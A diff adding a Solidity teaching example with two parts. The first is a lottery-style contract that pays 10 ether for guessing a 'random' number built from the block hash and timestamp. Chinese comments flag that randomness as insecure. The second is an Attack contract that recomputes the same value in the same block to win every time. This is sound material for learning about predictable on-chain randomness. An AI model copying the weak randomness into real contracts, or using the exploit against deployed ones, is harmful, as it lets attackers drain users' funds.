@@ -1,0 +1,29 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+contract guessTheRandomNumber {
+    constructor() public payable {}
+
+    function guess(uint _guess) public {
+        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
+        //这种获取随机数的方式是不安全的
+
+        if(_guess == answer) {
+            (bool sent,) = msg.sender.call{value: 10 ether}("");
+            //发送十个以太给猜中的人
+            require(sent, "failed to sent");
+        }
+    }
+}
+
+contract Attack {
+    fallback() external payable {}
+
+    function attack(guessTheRandomNumber Number) public {
+        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number-1), block.timestamp)));
+       Number.guess(answer);
+    //answer带到guess函数中
+}
+function getBalance() public view returns(uint) {
+    return address(this).balance;
+}
+}
